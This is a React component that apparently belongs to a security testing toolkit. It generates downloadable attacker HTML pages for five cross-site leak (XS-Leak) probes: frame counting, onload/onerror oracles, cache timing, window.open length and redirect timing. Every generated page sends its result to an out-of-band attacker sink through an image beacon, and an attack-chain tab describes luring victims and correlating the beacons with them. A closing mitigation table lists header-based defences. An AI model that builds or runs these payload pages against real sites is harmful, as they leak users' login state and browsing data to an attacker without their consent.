import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  DownloadButton,
  KVTable,
  NumberInput,
  OutputBlock,
  SectionTitle,
  Select,
  Slider,
  Tabs,
  TextInput,
} from '@/components/ui';
import { DEFAULT_OOB_DOMAIN } from '@/tools/registry';

type Probe = 'frames' | 'onload' | 'timing' | 'opener' | 'redirect';

const PROBES: Array<{ value: Probe; label: string }> = [
  { value: 'frames', label: 'Frame count — window.length' },
  { value: 'onload', label: 'onload / onerror oracle' },
  { value: 'timing', label: 'Timing oracle — performance.now delta' },
  { value: 'opener', label: 'window.open + frames.length probe' },
  { value: 'redirect', label: 'Redirect-to-leak chain' },
];

const MITIGATIONS: Array<[string, string, string]> = [
  ['Cross-Origin-Opener-Policy: same-origin', 'Severs window.opener between your page and the target', 'Kills window.open/frames.length probes'],
  ['Cross-Origin-Embedder-Policy: require-corp', 'Subresources must be CORP/CORS-approved', 'Blocks unauthorised framing and timing side channels'],
  ['Cross-Origin-Resource-Policy: same-origin', 'Response-only header on the target', 'Prevents cross-origin embedding entirely'],
  ['X-Frame-Options: DENY', 'Legacy framing control', 'Frame-count probes see an error page, not content'],
  ['Content-Security-Policy: frame-ancestors', 'Modern framing control, per-path', 'Narrower XFO replacement'],
  ['Sec-Fetch-Site enforcement', 'Server rejects cross-site subresource loads', 'Defeats redirect chains that land cross-site'],
  ['fetch-site isolation / state partitioning', 'Per-top-level-site cache and frame partitioning', 'Timing oracles lose the shared-cache signal'],
];

const BROWSER_NOTES: Array<[string, string]> = [
  ['Chromium ≥ 92', 'State partitioning per top-level site; window.length reads still work, opener access is blocked by default since 88'],
  ['Firefox ≥ 95', 'Partitioned caches; window.length readable, but cross-origin onload timings are quantised to 1 ms buckets'],
  ['Safari ≥ 16', 'ITP heavily partitions caches; CORB is replaced by ORB (heuristic). Timing oracle is the most reliable path'],
  ['Legacy / embedded WebViews', 'No COOP/COEP support — every probe works; prioritise these when the target ships a WebView client'],
  ['Firefox strict mode', "String(location) reads and some timing reads are gated behind 'privacy.resistFingerprinting'"],
];

export default function XsLeakGenerator() {
  const [probe, setProbe] = useState<Probe>('frames');
  const [probeUrl, setProbeUrl] = useState('https://example.com/account');
  const [sink, setSink] = useState(`https://${DEFAULT_OOB_DOMAIN}/leak`);
  const [threshold, setThreshold] = useState(120);
  const [iframes, setIframes] = useState(4);
  const [view, setView] = useState<'html' | 'notes' | 'chain'>('html');
  const [noCors, setNoCors] = useState(true);

  const url = probeUrl.trim() || 'https://example.com/account';
  const sinkUrl = sink.trim() || `https://${DEFAULT_OOB_DOMAIN}/leak`;

  const html = useMemo(() => {
    const head = '<!-- attacker page: served from your origin, opened by the victim -->';
    switch (probe) {
      case 'frames':
        return [
          head,
          '<iframe id="f" src="' + url + '" width="1" height="1" style="opacity:0"></iframe>',
          '<script>',
          '  const f = document.getElementById("f");',
          '  f.onload = () => {',
          '    // cross-origin: window.length is still readable (frame count, not DOM)',
          '    const n = f.contentWindow.length;',
          '    document.title = "frames:" + n;',
          `    new Image().src = "${sinkUrl}?probe=frames&n=" + n;`,
          '  };',
          '</script>',
        ].join('\n');
      case 'onload':
        return [
          head,
          '<script>',
          '  function oracle() {',
          '    return new Promise((res) => {',
          '      const f = document.createElement("iframe");',
          '      let done = false;',
          '      f.onload = () => { done = true; res("loaded"); };',
          '      f.onerror = () => { done = true; res("error"); };',
          '      f.src = "' + url + '";',
          '      document.body.appendChild(f);',
          '      setTimeout(() => { if (!done) res("blocked"); }, 3000);',
          '    });',
          '  }',
          '  oracle().then((r) => {',
          `    new Image().src = "${sinkUrl}?probe=onload&r=" + r;`,
          '  });',
          '</script>',
        ].join('\n');
      case 'timing':
        return [
          head,
          '<script>',
          '  async function timeIt(u) {',
          '    const t0 = performance.now();',
          '    try {',
          `      await fetch(u, { mode: "${noCors ? 'no-cors' : 'cors'}", cache: "force-cache" });`,
          '    } catch (e) {}',
          '    return Math.round(performance.now() - t0);',
          '  }',
          '  (async () => {',
          '    // warm the cache with a legitimate load, then time a hit vs a miss',
          `    const hit = await timeIt("${url}");`,
          `    const miss = await timeIt("${url}?nonce=" + Math.random());`,
          `    const verdict = (hit < ${threshold} && miss > ${threshold}) ? "cached" : "uncached";`,
          `    new Image().src = "${sinkUrl}?probe=timing&hit=" + hit + "&miss=" + miss + "&v=" + verdict;`,
          '  })();',
          '</script>',
        ].join('\n');
      case 'opener':
        return [
          head,
          '<script>',
          `  const w = window.open("${url}", "p", "width=420,height=320");`,
          '  let ticks = 0;',
          '  const t = setInterval(() => {',
          '    if (!w || ++ticks > 40) { clearInterval(t); return; }',
          '    try {',
          '      // reading .length on a cross-origin WindowProxy is allowed',
          '      const n = w.length;',
          `      new Image().src = "${sinkUrl}?probe=opener&n=" + n + "&tick=" + ticks;`,
          '      clearInterval(t);',
          '    } catch (e) { /* COOP blocked the reference */ }',
          '  }, 250);',
          '</script>',
        ].join('\n');
      default:
        return [
          head,
          '<script>',
          '  // chain: HTTPS probe → redirector → attacker endpoint that measures arrival time',
          '  const targets = [',
          '    "' + url + '",',
          '    "' + url + '?callback=x",',
          '    "' + url + '/../redirect?to=https://' + DEFAULT_OOB_DOMAIN + '/land",',
          '  ];',
          '  (async () => {',
          '    const results = [];',
          '    for (const u of targets) {',
          '      const t0 = performance.now();',
          '      try { await fetch(u, { mode: "no-cors", redirect: "follow", cache: "no-store" }); } catch (e) {}',
          '      results.push(Math.round(performance.now() - t0));',
          '    }',
          `    new Image().src = "${sinkUrl}?probe=redirect&t=" + results.join(",") + "&iframe=" + ${iframes};`,
          '  })();',
          '</script>',
        ].join('\n');
    }
  }, [probe, url, sinkUrl, threshold, noCors, iframes]);

  const chain = useMemo(
    () => [
      `1. Victim opens attacker page (${DEFAULT_OOB_DOMAIN}) — landing, ad slot, or a shared link.`,
      `2. Page creates ${iframes} iframe(s) / popup(s) pointing at ${url}.`,
      `3. Probe reads a cross-origin observable: window.length, onload timing, or a performance.now() delta.`,
      `4. Verdict is exfiltrated to ${sinkUrl} as an image beacon (no CORS preflight, no credentials).`,
      `5. Server correlates the beacon with a victim identity via the referrer-less token you planted in step 1.`,
    ].join('\n'),
    [sinkUrl, url, iframes],
  );

  return (
    <>
      <Card title="Probe">
        <div className="grid gap-4 sm:grid-cols-2">
          <Select label="Probe type" value={probe} onChange={setProbe} options={PROBES} hint="Each probe reads a different cross-origin observable" />
          <TextInput label="Target probe URL" value={probeUrl} onChange={setProbeUrl} mono placeholder="https://example.com/account" hint="A resource whose presence or timing you want to infer" />
          <TextInput label="Sink callback" value={sink} onChange={setSink} mono placeholder={`https://${DEFAULT_OOB_DOMAIN}/leak`} hint="Image beacon target — GET query only" />
          <NumberInput label="Frame count" value={iframes} onChange={setIframes} min={1} max={16} hint="Used by the redirect chain and multi-probe batches" />
          <Slider label="Timing threshold (ms)" value={threshold} onChange={setThreshold} min={10} max={800} step={5} format={(v) => `${v} ms`} />
          <div className="flex items-end pb-2">
            <Checkbox checked={noCors} onChange={setNoCors} label="no-cors fetch" description="Opaque response still resolves — timing survives, body does not" />
          </div>
        </div>
      </Card>

      <Card
        title="Payload page"
        action={<DownloadButton text={html} filename={`xsleak-${probe}.html`} label="Download .html" />}
      >
        <Tabs
          value={view}
          onChange={setView}
          tabs={[
            { value: 'html', label: 'HTML' },
            { value: 'chain', label: 'Chain' },
            { value: 'notes', label: 'Notes' },
          ]}
        />
        <div className="mt-3">
          {view === 'html' && <OutputBlock value={html} rows={18} label={`${probe} probe`} />}
          {view === 'chain' && <OutputBlock value={chain} rows={10} label="Attack chain" />}
          {view === 'notes' && (
            <KVTable
              rows={[
                ['Observable', probe === 'frames' ? 'window.length (frame count, cross-origin readable)' : probe === 'timing' ? 'performance.now() delta over cache hit/miss' : probe === 'onload' ? 'load vs error event ordering' : probe === 'opener' ? 'WindowProxy.length' : 'arrival time across redirects'],
                ['CORB / ORB', 'Opaque responses are stripped, not blocked — timing still leaks; body never does'],
                ['COEP', 'require-corp turns every non-CORP subresource into a network error, which itself is a signal'],
                ['Credentials', 'beacons are credential-less — correlate by an attacker-planted token, not the victim cookie'],
              ]}
            />
          )}
        </div>
      </Card>

      <Card title="Mitigation table">
        <div className="overflow-x-auto">
          <table className="w-full border-collapse text-[12.5px]">
            <thead>
              <tr className="text-left text-[11px] uppercase tracking-wide text-[var(--text-faint)]">
                <th className="border-b border-[var(--card-border)] px-2 py-1.5">Control</th>
                <th className="border-b border-[var(--card-border)] px-2 py-1.5">Effect</th>
                <th className="border-b border-[var(--card-border)] px-2 py-1.5">Against this probe</th>
              </tr>
            </thead>
            <tbody>
              {MITIGATIONS.map(([control, effect, against]) => (
                <tr key={control} className="align-top">
                  <td className="border-b border-[var(--card-border)] px-2 py-1.5 rf-mono text-[var(--text)]">{control}</td>
                  <td className="border-b border-[var(--card-border)] px-2 py-1.5 text-[var(--text-muted)]">{effect}</td>
                  <td className="border-b border-[var(--card-border)] px-2 py-1.5 text-[var(--text-muted)]">{against}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Card>

      <Card title="Browser notes">
        <ul className="m-0 list-disc pl-5 text-[12.5px] leading-relaxed text-[var(--text-muted)]">
          {BROWSER_NOTES.map(([b, note]) => (
            <li key={b}>
              <span className="text-[var(--text)]">{b}</span> — {note}
            </li>
          ))}
        </ul>
        <div className="mt-4">
          <SectionTitle>Reading a result</SectionTitle>
          <Callout tone="info" title="One bit per probe">
            Cross-site leaks are <em>boolean</em> channels: logged-in vs logged-out, frame present vs absent, cached vs not.
            Run the probe with a clean profile and again with the victim session, and diff the verdict strings. A
            &quot;blocked&quot; result is itself informative — it usually means COOP or frame-ancestors is already set.
          </Callout>
        </div>
      </Card>
    </>
  );
}
